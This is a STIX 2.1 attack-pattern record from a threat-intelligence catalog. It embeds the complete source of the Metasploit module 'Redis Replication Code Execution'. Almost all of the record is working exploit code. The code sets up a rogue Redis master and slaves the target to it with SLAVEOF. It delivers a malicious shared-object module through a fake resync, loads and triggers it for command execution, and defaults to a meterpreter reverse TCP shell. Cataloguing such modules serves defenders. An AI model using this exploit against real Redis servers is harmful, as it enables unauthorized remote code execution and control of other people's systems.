{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d49aa8d5-776e-4ac3-9329-a1b3e6f3cdeb",
    "created": "2024-08-14T16:58:02.110032Z",
    "modified": "2024-08-14T16:58:02.110036Z",
    "name": "Redis Replication Code Execution",
    "description": " This module can be used to leverage the extension functionality added since Redis 4.0.0 to execute arbitrary code. To transmit the given extension it makes use of the feature of Redis which called replication between master and slave.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/redis/redis_replication_cmd_exec.rb",
            "external_id": "redis_replication_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/RedisLabs/RedisModulesSDK"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Auxiliary::Redis\n  include Msf::Module::Deprecated\n\n  moved_from \"exploit/linux/redis/redis_unauth_exec\"\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Redis Replication Code Execution',\n      'Description'    => %q{\n        This module can be used to leverage the extension functionality added since Redis 4.0.0\n        to execute arbitrary code. To transmit the given extension it makes use of the feature of Redis\n        which called replication between master and slave.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Green-m  <greenm.xxoo[at]gmail.com>'     # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf'],\n          [ 'URL', 'https://github.com/RedisLabs/RedisModulesSDK']\n        ],\n\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        =>\n        [\n          ['Automatic',  {} ],\n        ],\n      'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'SRVPORT' => '6379'\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2018-11-13',\n      'DefaultTarget'  => 0,\n      'Notes'          =>\n        {\n          'Stability'   => [ SERVICE_RESOURCE_LOSS],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS, ]\n        },\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(6379),\n        OptBool.new('CUSTOM', [true, 'Whether compile payload file during exploiting', true])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('RedisModuleInit', [false, 'The command of module to load and unload. Random string as default.']),\n        OptString.new('RedisModuleTrigger', [false, 'The command of module to trigger the given function. Random string as default.']),\n        OptString.new('RedisModuleName', [false, 'The name of module to load at first. Random string as default.'])\n      ]\n    )\n    deregister_options('URIPATH', 'THREADS', 'SSLCert')\n  end\n\n  #\n  # Now tested on redis 4.x and 5.x\n  #\n  def check\n    connect\n    # they are only vulnerable if we can run the CONFIG command, so try that\n    return Exploit::CheckCode::Safe unless (config_data = redis_command('CONFIG', 'GET', '*')) && config_data =~ /dbfilename/\n\n    if (info_data = redis_command('INFO')) && /redis_version:(?<redis_version>\\S+)/ =~ info_data\n      report_redis(redis_version)\n    end\n\n    unless redis_version\n      print_error('Cannot retrieve redis version, please check it manually')\n      return Exploit::CheckCode::Unknown\n    end\n\n    # Only vulnerable to version 4.x or 5.x\n    version = Rex::Version.new(redis_version)\n    if version >= Rex::Version.new('4.0.0')\n      vprint_status(\"Redis version is #{redis_version}\")\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  ensure\n    disconnect\n  end\n\n  def has_check?\n    true # Overrides the override in Msf::Auxiliary::Scanner imported by Msf::Auxiliary::Redis\n  end\n\n  def exploit\n    if check_custom\n      @module_init_name = datastore['RedisModuleInit']    || Rex::Text.rand_text_alpha_lower(4..8)\n      @module_cmd       = datastore['RedisModuleTrigger'] || \"#{@module_init_name}.#{Rex::Text.rand_text_alpha_lower(4..8)}\"\n    else\n      @module_init_name = 'shell'\n      @module_cmd       = 'shell.exec'\n    end\n\n    if srvhost == '0.0.0.0'\n      fail_with(Failure::BadConfig, 'Make sure SRVHOST not be 0.0.0.0, or the slave failed to find master.')\n    end\n\n    #\n    # Prepare for payload.\n    #\n    #  1. Use custcomed payload, it would compile a brand new file during running, which is more undetectable.\n    #     It's only worked on linux system.\n    #\n    #  2. Use compiled payload, it's avaiable on all OS, however more detectable.\n    #\n    if check_custom\n      buf = create_payload\n      generate_code_file(buf)\n      compile_payload\n    end\n\n    connect\n\n    #\n    # Send the payload.\n    #\n    redis_command('SLAVEOF', srvhost, srvport.to_s)\n    redis_command('CONFIG', 'SET', 'dbfilename', \"#{module_file}\")\n    ::IO.select(nil, nil, nil, 2.0)\n\n    # start the rogue server\n    start_rogue_server\n    # waiting for victim to receive the payload.\n    Rex.sleep(1)\n    redis_command('MODULE', 'LOAD', \"./#{module_file}\")\n    redis_command('SLAVEOF', 'NO', 'ONE')\n\n    # Trigger it.\n    print_status('Sending command to trigger payload.')\n    pull_the_trigger\n\n    # Clean up\n    Rex.sleep(2)\n    register_file_for_cleanup(\"./#{module_file}\")\n    #redis_command('CONFIG', 'SET', 'dbfilename', 'dump.rdb')\n    #redis_command('MODULE', 'UNLOAD', \"#{@module_init_name}\")\n\n  ensure\n    disconnect\n  end\n\n  #\n  # We pretend to be a real redis server, and then slave the victim.\n  #\n  def start_rogue_server\n    begin\n      socket = Rex::Socket::TcpServer.create({'LocalHost'=>srvhost,'LocalPort'=>srvport})\n      print_status(\"Listening on #{srvhost}:#{srvport}\")\n    rescue Rex::BindFailed\n      print_warning(\"Handler failed to bind to #{srvhost}:#{srvport}\")\n      print_status(\"Listening on 0.0.0.0:#{srvport}\")\n      socket = Rex::Socket::TcpServer.create({'LocalHost'=>'0.0.0.0', 'LocalPort'=>srvport})\n    end\n\n    rsock = socket.accept()\n    vprint_status('Accepted a connection')\n\n    # Start negotiation\n    while true\n      request = rsock.read(1024)\n      vprint_status(\"in<<< #{request.inspect}\")\n      response = \"\"\n      finish = false\n\n      case\n      when request.include?('PING')\n        response = \"+PONG\\r\\n\"\n      when request.include?('REPLCONF')\n        response = \"+OK\\r\\n\"\n      when request.include?('PSYNC') || request.include?('SYNC')\n        response  = \"+FULLRESYNC #{'Z'*40} 1\\r\\n\"\n        response << \"$#{payload_bin.length}\\r\\n\"\n        response << \"#{payload_bin}\\r\\n\"\n        finish = true\n      end\n\n      if response.length < 200\n        vprint_status(\"out>>> #{response.inspect}\")\n      else\n        vprint_status(\"out>>> #{response.inspect[0..100]}......#{response.inspect[-100..-1]}\")\n      end\n\n      rsock.put(response)\n\n      if finish\n        print_status('Rogue server close...')\n        rsock.close()\n        socket.close()\n        break\n      end\n    end\n  end\n\n  def pull_the_trigger\n    if check_custom\n      redis_command(\"#{@module_cmd}\")\n    else\n      execute_cmdstager\n    end\n  end\n\n  #\n  # Parpare command stager for the pre-compiled payload.\n  # And the command of module is hard-coded.\n  #\n  def execute_command(cmd, opts = {})\n    redis_command('shell.exec',\"#{cmd.to_s}\") rescue nil\n  end\n\n  #\n  # Generate source code file of payload to be compiled dynamicly.\n  #\n  def generate_code_file(buf)\n    template       = File.read(File.join(Msf::Config.data_directory, 'exploits', 'redis', 'module.erb'))\n    File.open(File.join(Msf::Config.data_directory, 'exploits', 'redis', 'module.c'), 'wb') { |file| file.write(ERB.new(template).result(binding))}\n  end\n\n  def compile_payload\n    make_file = File.join(Msf::Config.data_directory, 'exploits', 'redis', 'Makefile')\n    vprint_status(\"Clean old files\")\n    vprint_status(%x|make -C #{File.dirname(make_file)}/rmutil clean|)\n    vprint_status(%x|make -C #{File.dirname(make_file)} clean|)\n\n    print_status('Compile redis module extension file')\n    res = %x|make -C #{File.dirname(make_file)} -f #{make_file} && echo true|\n    if res.include? 'true'\n      print_good(\"Payload generated successfully! \")\n    else\n      print_error(res)\n      fail_with(Failure::BadConfig, 'Check config of gcc compiler.')\n    end\n  end\n\n  #\n  # check the environment for compile payload to so file.\n  #\n  def check_env\n    # check if linux\n    return false unless %x|uname -s 2>/dev/null|.include? \"Linux\"\n    # check if gcc installed\n    return false unless %x|command -v gcc && echo true|.include? \"true\"\n    # check if ld installed\n    return false unless %x|command -v ld && echo true|.include? \"true\"\n\n    true\n  end\n\n  def check_custom\n    return @custom_payload if @custom_payload\n\n    @custom_payload = false\n    @custom_payload = true if check_env && datastore['CUSTOM']\n\n    @custom_payload\n  end\n\n  def module_file\n    return @module_file if @module_file\n    @module_file = datastore['RedisModuleName']  || \"#{Rex::Text.rand_text_alpha_lower(4..8)}.so\"\n  end\n\n  def create_payload\n    p = payload.encoded\n    Msf::Simple::Buffer.transform(p, 'c', 'buf')\n  end\n\n  def payload_bin\n    return @payload_bin if @payload_bin\n    if check_custom\n      @payload_bin = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'redis', 'module.so'))\n    else\n      @payload_bin = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'redis', 'exp',  'exp.so'))\n    end\n    @payload_bin\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-11-13",
    "x_mitre_platforms": [
        "linux'"
    ]
}